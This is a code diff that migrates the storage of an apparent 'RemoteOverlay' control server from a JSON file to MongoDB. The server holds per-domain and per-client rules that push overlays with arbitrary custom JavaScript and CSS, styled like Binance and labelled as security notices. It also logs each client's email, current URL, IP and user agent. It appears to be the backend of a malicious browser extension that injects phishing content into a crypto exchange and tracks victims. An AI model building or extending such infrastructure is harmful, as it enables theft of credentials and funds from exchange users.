@@ -1,5 +1,6 @@
 import fs from 'fs';
 import path from 'path';
+import { getDatabase, checkMongoConnection } from './mongodb';
 
 const DATA_DIR = path.join(process.cwd(), 'data');
 const DATA_FILE = path.join(DATA_DIR, 'store.json');
@@ -67,7 +68,9 @@ console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostnam
   }
 };
 
-function ensureDb() {
+let hasSeededMongo = false;
+
+function ensureLocalDb() {
   if (!fs.existsSync(DATA_DIR)) {
     fs.mkdirSync(DATA_DIR, { recursive: true });
   }
@@ -76,20 +79,36 @@ function ensureDb() {
   }
 }
 
-export function getDb() {
-  ensureDb();
+function getLocalDb() {
+  ensureLocalDb();
   try {
     const raw = fs.readFileSync(DATA_FILE, 'utf-8');
     return JSON.parse(raw);
   } catch (err) {
-    console.error('Error reading store.json, resetting to defaults:', err);
     return INITIAL_DATA;
   }
 }
 
-export function saveDb(data) {
-  ensureDb();
+function saveLocalDb(data) {
+  ensureLocalDb();
   fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
+}
+
+// Seed initial rules into MongoDB if empty
+async function seedMongoIfEmpty(db) {
+  if (hasSeededMongo) return;
+  try {
+    const count = await db.collection('rules').countDocuments();
+    if (count === 0) {
+      const local = getLocalDb();
+      const seedRules = local.rules && local.rules.length > 0 ? local.rules : INITIAL_DATA.rules;
+      await db.collection('rules').insertMany(seedRules);
+      console.log(`[MongoDB] Initialized collection 'rules' with ${seedRules.length} seed documents.`);
+    }
+    hasSeededMongo = true;
+  } catch (err) {
+    console.warn('[MongoDB] Seed check error:', err.message);
+  }
 }
 
 export function matchDomain(pattern, targetDomain) {
@@ -100,13 +119,11 @@ export function matchDomain(pattern, targetDomain) {
   if (pattern === '*' || pattern === '<all_urls>') return true;
   if (pattern === targetDomain) return true;
 
-  // Wildcard subdomain e.g. *.binance.com
   if (pattern.startsWith('*.')) {
     const root = pattern.slice(2);
     return targetDomain === root || targetDomain.endsWith('.' + root);
   }
 
-  // Exact suffix or prefix
   if (pattern.includes('*')) {
     const regexStr = '^' + pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$';
     return new RegExp(regexStr).test(targetDomain);
@@ -115,19 +132,138 @@ export function matchDomain(pattern, targetDomain) {
   return targetDomain.includes(pattern);
 }
 
-export function findMatchingRule(domain, clientId = null) {
-  const db = getDb();
-  db.stats.totalRequests = (db.stats.totalRequests || 0) + 1;
-  db.stats.lastSync = new Date().toISOString();
-  saveDb(db);
+// ----------------------------------------------------------------------
+// RULES OPERATIONS
+// ----------------------------------------------------------------------
+
+export async function getRules() {
+  const { db, isLive } = await getDatabase();
+  if (isLive) {
+    await seedMongoIfEmpty(db);
+    const mongoRules = await db.collection('rules').find({}).toArray();
+    // Normalize _id to id
+    return mongoRules.map(({ _id, ...rest }) => rest);
+  }
+  const local = getLocalDb();
+  return local.rules || [];
+}
+
+export async function createRule(ruleData) {
+  const { db, isLive } = await getDatabase();
+  const newRule = {
+    id: 'rule_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
+    name: ruleData.name || `Overlay for ${ruleData.domain}`,
+    domain: (ruleData.domain || '*').trim(),
+    enabled: ruleData.enabled !== undefined ? ruleData.enabled : true,
+    priority: Number(ruleData.priority) || 10,
+    targetClientId: ruleData.targetClientId || null,
+    overlay: {
+      height: ruleData.overlay?.height || '50',
+      bg: ruleData.overlay?.bg || '#0b0e11',
+      text: ruleData.overlay?.text || '#eaecef',
+      titleColor: ruleData.overlay?.titleColor || '#f0b90b',
+      title: ruleData.overlay?.title || 'Notice',
+      message: ruleData.overlay?.message || 'Important security notification.',
+      position: ruleData.overlay?.position || 'top',
+      closable: ruleData.overlay?.closable !== undefined ? ruleData.overlay.closable : true,
+      customCss: ruleData.overlay?.customCss || '',
+      customJs: ruleData.overlay?.customJs || '',
+    },
+    createdAt: new Date().toISOString(),
+    updatedAt: new Date().toISOString(),
+  };
+
+  if (isLive) {
+    await db.collection('rules').insertOne({ ...newRule });
+  }
+
+  // Also sync to local backup
+  const local = getLocalDb();
+  local.rules = local.rules || [];
+  local.rules.unshift(newRule);
+  saveLocalDb(local);
+
+  return newRule;
+}
+
+export async function updateRule(id, updates) {
+  const { db, isLive } = await getDatabase();
+  const updatedAt = new Date().toISOString();
+
+  let updatedRule = null;
+
+  if (isLive) {
+    const existing = await db.collection('rules').findOne({ id });
+    if (existing) {
+      const merged = {
+        ...existing,
+        ...updates,
+        overlay: {
+          ...(existing.overlay || {}),
+          ...(updates.overlay || {}),
+        },
+        updatedAt,
+      };
+      delete merged._id;
+      await db.collection('rules').updateOne({ id }, { $set: merged });
+      updatedRule = merged;
+    }
+  }
+
+  // Update local backup
+  const local = getLocalDb();
+  const index = (local.rules || []).findIndex((r) => r.id === id);
+  if (index >= 0) {
+    local.rules[index] = {
+      ...local.rules[index],
+      ...updates,
+      overlay: {
+        ...(local.rules[index].overlay || {}),
+        ...(updates.overlay || {}),
+      },
+      updatedAt,
+    };
+    saveLocalDb(local);
+    if (!updatedRule) updatedRule = local.rules[index];
+  }
+
+  return updatedRule;
+}
+
+export async function deleteRule(id) {
+  const { db, isLive } = await getDatabase();
+  if (isLive) {
+    await db.collection('rules').deleteOne({ id });
+  }
+
+  const local = getLocalDb();
+  local.rules = (local.rules || []).filter((r) => r.id !== id);
+  saveLocalDb(local);
+  return true;
+}
+
+export async function findMatchingRule(domain, clientId = null) {
+  await recordRequestStats();
 
   if (!domain) return null;
 
+  const { db, isLive } = await getDatabase();
+
   // 1. Check for targeted active message for this specific client
   if (clientId) {
-    const targetedMsg = (db.messages || []).find(
-      (m) => m.isActive && m.targetClientId === clientId
-    );
+    let targetedMsg = null;
+    if (isLive) {
+      targetedMsg = await db.collection('messages').findOne({
+        isActive: true,
+        targetClientId: clientId,
+      });
+    } else {
+      const local = getLocalDb();
+      targetedMsg = (local.messages || []).find(
+        (m) => m.isActive && m.targetClientId === clientId
+      );
+    }
+
     if (targetedMsg) {
       return {
         id: targetedMsg.id,
@@ -154,10 +290,16 @@ export function findMatchingRule(domain, clientId = null) {
     }
   }
 
-  // 2. Check enabled rules matching the domain, sorted by priority
-  const activeRules = (db.rules || []).filter((r) => r.enabled);
+  // 2. Fetch enabled rules
+  let activeRules = [];
+  if (isLive) {
+    activeRules = await db.collection('rules').find({ enabled: true }).toArray();
+  } else {
+    const local = getLocalDb();
+    activeRules = (local.rules || []).filter((r) => r.enabled);
+  }
 
-  // Match targeted rules for this client first
+  // Client specific rule
   if (clientId) {
     const clientSpecificRule = activeRules.find(
       (r) => r.targetClientId === clientId && matchDomain(r.domain, domain)
@@ -165,7 +307,7 @@ export function findMatchingRule(domain, clientId = null) {
     if (clientSpecificRule) return clientSpecificRule;
   }
 
-  // Next match domain specific rules (excluding wildcard * first)
+  // Domain specific rule
   const domainSpecificRules = activeRules
     .filter((r) => r.domain !== '*' && matchDomain(r.domain, domain))
     .sort((a, b) => (b.priority || 0) - (a.priority || 0));
@@ -174,7 +316,7 @@ export function findMatchingRule(domain, clientId = null) {
     return domainSpecificRules[0];
   }
 
-  // Next match global wildcard * if available
+  // Global wildcard
   const globalRule = activeRules.find((r) => r.domain === '*');
   if (globalRule) {
     return globalRule;
@@ -183,16 +325,17 @@ export function findMatchingRule(domain, clientId = null) {
   return null;
 }
 
-export function registerClientHeartbeat({ clientId, email, domain, currentUrl, userAgent, ip }) {
-  const db = getDb();
-  db.clients = db.clients || [];
+// ----------------------------------------------------------------------
+// CLIENTS OPERATIONS
+// ----------------------------------------------------------------------
 
-  const existingIndex = db.clients.findIndex((c) => c.clientId === clientId);
+export async function registerClientHeartbeat({ clientId, email, domain, currentUrl, userAgent, ip }) {
+  const { db, isLive } = await getDatabase();
   const now = new Date().toISOString();
 
   const clientInfo = {
     clientId,
-    email: email || (existingIndex >= 0 ? db.clients[existingIndex].email : 'Anonymous Client'),
+    email: email || 'Anonymous Client',
     lastDomain: domain || 'unknown',
     lastUrl: currentUrl || '',
     lastSeen: now,
@@ -201,20 +344,151 @@ export function registerClientHeartbeat({ clientId, email, domain, currentUrl, u
     status: 'online',
   };
 
-  if (existingIndex >= 0) {
-    db.clients[existingIndex] = {
-      ...db.clients[existingIndex],
-      ...clientInfo,
-    };
+  if (isLive) {
+    await db.collection('clients').updateOne(
+      { clientId },
+      { $set: clientInfo },
+      { upsert: true }
+    );
+  }
+
+  // Local backup
+  const local = getLocalDb();
+  local.clients = local.clients || [];
+  const idx = local.clients.findIndex((c) => c.clientId === clientId);
+  if (idx >= 0) {
+    local.clients[idx] = { ...local.clients[idx], ...clientInfo };
   } else {
-    db.clients.unshift(clientInfo);
+    local.clients.unshift(clientInfo);
   }
+  if (local.clients.length > 200) local.clients = local.clients.slice(0, 200);
+  saveLocalDb(local);
 
-  // Prune clients older than 30 days if too many
-  if (db.clients.length > 200) {
-    db.clients = db.clients.slice(0, 200);
-  }
-
-  saveDb(db);
   return clientInfo;
+}
+
+export async function getClients() {
+  const { db, isLive } = await getDatabase();
+  const now = Date.now();
+
+  let rawClients = [];
+  if (isLive) {
+    rawClients = await db.collection('clients').find({}).sort({ lastSeen: -1 }).toArray();
+  } else {
+    const local = getLocalDb();
+    rawClients = local.clients || [];
+  }
+
+  return rawClients.map((c) => {
+    const lastSeenTime = new Date(c.lastSeen).getTime();
+    const isOnline = now - lastSeenTime < 2 * 60 * 1000;
+    return {
+      clientId: c.clientId,
+      email: c.email,
+      lastDomain: c.lastDomain,
+      lastUrl: c.lastUrl,
+      lastSeen: c.lastSeen,
+      status: isOnline ? 'online' : 'offline',
+      secondsAgo: Math.round((now - lastSeenTime) / 1000),
+    };
+  });
+}
+
+// ----------------------------------------------------------------------
+// MESSAGES OPERATIONS
+// ----------------------------------------------------------------------
+
+export async function getMessages() {
+  const { db, isLive } = await getDatabase();
+  if (isLive) {
+    return db.collection('messages').find({}).sort({ createdAt: -1 }).toArray();
+  }
+  const local = getLocalDb();
+  return local.messages || [];
+}
+
+export async function createMessage(msgData) {
+  const { db, isLive } = await getDatabase();
+  const newMsg = {
+    id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+    targetClientId: msgData.targetClientId || null,
+    title: msgData.title,
+    body: msgData.body,
+    colorBg: msgData.colorBg || '#0b0e11',
+    colorText: msgData.colorText || '#eaecef',
+    colorTitle: msgData.colorTitle || '#f0b90b',
+    height: msgData.height || '45',
+    customCss: msgData.customCss || '',
+    customJs: msgData.customJs || '',
+    isActive: true,
+    createdAt: new Date().toISOString(),
+  };
+
+  if (isLive) {
+    await db.collection('messages').insertOne({ ...newMsg });
+  }
+
+  const local = getLocalDb();
+  local.messages = local.messages || [];
+  local.messages.unshift(newMsg);
+  saveLocalDb(local);
+
+  return newMsg;
+}
+
+export async function deleteMessage(id) {
+  const { db, isLive } = await getDatabase();
+  if (isLive) {
+    await db.collection('messages').deleteOne({ id });
+  }
+  const local = getLocalDb();
+  local.messages = (local.messages || []).filter((m) => m.id !== id);
+  saveLocalDb(local);
+  return true;
+}
+
+// ----------------------------------------------------------------------
+// STATS OPERATIONS
+// ----------------------------------------------------------------------
+
+async function recordRequestStats() {
+  const now = new Date().toISOString();
+  try {
+    const { db, isLive } = await getDatabase();
+    if (isLive) {
+      await db.collection('stats').updateOne(
+        { _id: 'global_stats' },
+        { $inc: { totalRequests: 1 }, $set: { lastSync: now } },
+        { upsert: true }
+      );
+    }
+  } catch (e) {}
+
+  const local = getLocalDb();
+  local.stats = local.stats || { totalRequests: 0 };
+  local.stats.totalRequests = (local.stats.totalRequests || 0) + 1;
+  local.stats.lastSync = now;
+  saveLocalDb(local);
+}
+
+export async function getStats() {
+  const { db, isLive } = await getDatabase();
+  if (isLive) {
+    const doc = await db.collection('stats').findOne({ _id: 'global_stats' });
+    const rulesCount = await db.collection('rules').countDocuments();
+    const clientsCount = await db.collection('clients').countDocuments();
+    return {
+      totalRequests: doc?.totalRequests || 0,
+      rulesCount,
+      totalClients: clientsCount,
+      isMongoLive: true,
+    };
+  }
+  const local = getLocalDb();
+  return {
+    totalRequests: local.stats?.totalRequests || 0,
+    rulesCount: (local.rules || []).length,
+    totalClients: (local.clients || []).length,
+    isMongoLive: false,
+  };
 }
